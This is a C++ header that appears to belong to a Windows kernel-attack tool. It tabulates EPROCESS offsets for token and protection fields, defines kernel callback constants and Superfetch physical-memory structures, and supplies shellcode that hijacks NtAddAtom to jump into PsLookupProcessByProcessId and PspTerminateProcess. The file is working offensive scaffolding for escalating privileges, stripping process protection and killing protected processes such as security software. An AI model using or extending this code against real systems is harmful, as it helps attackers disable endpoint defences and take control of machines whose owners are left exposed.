#pragma once
#include <windows.h>

// ==================== EPROCESS offset table ====================

struct EprocessOffsets {
    DWORD DirectoryTableBase;
    DWORD UniqueProcessId;
    DWORD ActiveProcessLinks;
    DWORD Token;
    DWORD ImageFileName;
    DWORD Protection;
    DWORD SignatureLevel;
    DWORD SectionSignatureLevel;
};

// Windows 10 22H2 / Windows 11 21H2-23H2 / Windows Server 2022
static const EprocessOffsets OFFSETS_LEGACY = {
    0x028, 0x440, 0x448, 0x4B8, 0x5A8, 0x87A, 0x878, 0x879
};

// Windows 11 24H2 (build 26100+) — EPROCESS was heavily restructured
static const EprocessOffsets OFFSETS_WIN11_24H2 = {
    0x028, 0x1D0, 0x1D8, 0x248, 0x338, 0x5FA, 0x5F8, 0x5F9
};

static const EprocessOffsets& SelectOffsets() {
    typedef LONG(WINAPI* pRtlGetVersion)(OSVERSIONINFOW*);
    auto RtlGetVersion = (pRtlGetVersion)GetProcAddress(
        GetModuleHandleW(L"ntdll.dll"), "RtlGetVersion");

    OSVERSIONINFOEXW ovi = { sizeof(ovi) };
    if (RtlGetVersion) RtlGetVersion((OSVERSIONINFOW*)&ovi);

    printf("[*] Windows build: %lu.%lu.%lu\n",
           ovi.dwMajorVersion, ovi.dwMinorVersion, ovi.dwBuildNumber);

    if (ovi.dwBuildNumber >= 26100)
        return OFFSETS_WIN11_24H2;
    return OFFSETS_LEGACY;
}

// ==================== Kernel callback constants ====================
#define MAX_NOTIFY_CALLBACKS 64
#define CALLBACK_ENTRY_MASK  (~0xFULL)
#define CALLBACK_BLOCK_FUNCTION_OFFSET  0x08

// ==================== NtQuerySystemInformation classes ====================
#define SystemModuleInformation              11
#define SystemHandleInformation              16
#define SystemExtendedHandleInformation      64
#define SystemSuperfetchInformation          79

typedef struct _RTL_PROCESS_MODULE_INFORMATION {
    HANDLE  Section;
    PVOID   MappedBase;
    PVOID   ImageBase;
    ULONG   ImageSize;
    ULONG   Flags;
    USHORT  LoadOrderIndex;
    USHORT  InitOrderIndex;
    USHORT  LoadCount;
    USHORT  OffsetToFileName;
    UCHAR   FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION, *PRTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES {
    ULONG NumberOfModules;
    RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES, *PRTL_PROCESS_MODULES;

typedef LONG(WINAPI* fnNtQuerySystemInformation)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength);

// ==================== Superfetch structures ====================

typedef enum _SUPERFETCH_INFORMATION_CLASS {
    SuperfetchRetrieveTrace = 1,
    SuperfetchSystemParameters = 2,
    SuperfetchLogEvent = 3,
    SuperfetchGenerateTrace = 4,
    SuperfetchPrefetch = 5,
    SuperfetchPfnQuery = 6,
    SuperfetchPfnSetPriority = 7,
    SuperfetchPrivSourceQuery = 8,
    SuperfetchSequenceNumberQuery = 9,
    SuperfetchScenarioPhase = 10,
    SuperfetchWorkerPriority = 11,
    SuperfetchScenarioQuery = 12,
    SuperfetchScenarioPrefetch = 13,
    SuperfetchRobustnessControl = 14,
    SuperfetchTimeControl = 15,
    SuperfetchMemoryListQuery = 16,
    SuperfetchMemoryRangesQuery = 17,
    SuperfetchTracingControl = 18,
    SuperfetchTrimWhileAgingControl = 19,
    SuperfetchInformationMax = 20
} SUPERFETCH_INFORMATION_CLASS;

typedef struct _SUPERFETCH_INFORMATION {
    ULONG Version;
    ULONG Magic;
    SUPERFETCH_INFORMATION_CLASS InfoClass;
    PVOID Data;
    ULONG Length;
} SUPERFETCH_INFORMATION, *PSUPERFETCH_INFORMATION;

typedef struct _SYSTEM_MEMORY_LIST_INFORMATION {
    ULONG_PTR ZeroPageCount;
    ULONG_PTR FreePageCount;
    ULONG_PTR ModifiedPageCount;
    ULONG_PTR ModifiedNoWritePageCount;
    ULONG_PTR BadPageCount;
    ULONG_PTR PageCountByPriority[8];
    ULONG_PTR RepurposedPagesByPriority[8];
    ULONG_PTR ModifiedPageCountPageFile;
} SYSTEM_MEMORY_LIST_INFORMATION;

typedef struct _MEMORY_FRAME_INFORMATION {
    ULONGLONG UseDescription : 4;
    ULONGLONG ListDescription : 3;
    ULONGLONG Cold : 1;
    ULONGLONG Pinned : 1;
    ULONGLONG DontUse : 48;
    ULONGLONG Priority : 3;
    ULONGLONG NonTradeable : 1;
    ULONGLONG Reserved : 3;
} MEMORY_FRAME_INFORMATION;

typedef struct _FILEOFFSET_INFORMATION {
    ULONGLONG DontUse : 9;
    ULONGLONG Offset : 48;
    ULONGLONG Reserved : 7;
} FILEOFFSET_INFORMATION;

typedef struct _PAGEDIR_INFORMATION {
    ULONGLONG DontUse : 9;
    ULONGLONG PageDirectoryBase : 48;
    ULONGLONG Reserved : 7;
} PAGEDIR_INFORMATION;

typedef struct _UNIQUE_PROCESS_INFORMATION {
    ULONGLONG DontUse : 9;
    ULONGLONG UniqueProcessKey : 48;
    ULONGLONG Reserved : 7;
} UNIQUE_PROCESS_INFORMATION;

typedef struct _MMPFN_IDENTITY {
    union {
        MEMORY_FRAME_INFORMATION e1;
        FILEOFFSET_INFORMATION e2;
        PAGEDIR_INFORMATION e3;
        UNIQUE_PROCESS_INFORMATION e4;
    } u1;
    ULONG_PTR PageFrameIndex;
    union {
        struct {
            ULONG_PTR Image : 1;
            ULONG_PTR Mismatch : 1;
        } e1;
        PVOID FileObject;
        PVOID UniqueFileObjectKey;
        PVOID ProtoPteAddress;
        PVOID VirtualAddress;
    } u2;
} MMPFN_IDENTITY, *PMMPFN_IDENTITY;

typedef struct _PF_PFN_PRIO_REQUEST {
    ULONG Version;
    ULONG RequestFlags;
    ULONG_PTR PfnCount;
    SYSTEM_MEMORY_LIST_INFORMATION MemInfo;
    MMPFN_IDENTITY PageData[1];
} PF_PFN_PRIO_REQUEST, *PPF_PFN_PRIO_REQUEST;

#define SE_PROF_SINGLE_PROCESS_PRIVILEGE 13
#define SE_DEBUG_PRIVILEGE               20

typedef struct _PF_PHYSICAL_MEMORY_RANGE {
    ULONG_PTR BasePfn;
    ULONG_PTR PageCount;
} PF_PHYSICAL_MEMORY_RANGE, *PPF_PHYSICAL_MEMORY_RANGE;

typedef struct _PF_MEMORY_RANGE_INFO_V1 {
    ULONG Version;
    ULONG RangeCount;
    PF_PHYSICAL_MEMORY_RANGE Ranges[1];
} PF_MEMORY_RANGE_INFO_V1, *PPF_MEMORY_RANGE_INFO_V1;

typedef struct _PF_MEMORY_RANGE_INFO_V2 {
    ULONG Version;
    ULONG Flags;
    ULONG RangeCount;
    PF_PHYSICAL_MEMORY_RANGE Ranges[1];
} PF_MEMORY_RANGE_INFO_V2, *PPF_MEMORY_RANGE_INFO_V2;

#define SUPERFETCH_VERSION 45
#define SUPERFETCH_MAGIC   0x6B756843  // 'kuhC'

// ==================== NtAddAtom hooking ====================

// Declared with PVOID params so we can pass 64-bit values through the hijacked call.
// The real NtAddAtom takes (PWSTR, ULONG, PUSHORT), but once we JMP to
// PsLookupProcessByProcessId / PspTerminateProcess the kernel reads
// full 64-bit registers (RCX, RDX).
typedef LONG(NTAPI* fnNtAddAtomHijack)(PVOID Param1, PVOID Param2, PVOID Param3);

#define HOOK_SHELLCODE_SIZE 12
// mov rax, imm64; jmp rax
static const BYTE HOOK_TEMPLATE[HOOK_SHELLCODE_SIZE] = {
    0x48, 0xB8,                          // mov rax, ...
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // <target VA>
    0xFF, 0xE0                           // jmp rax
};
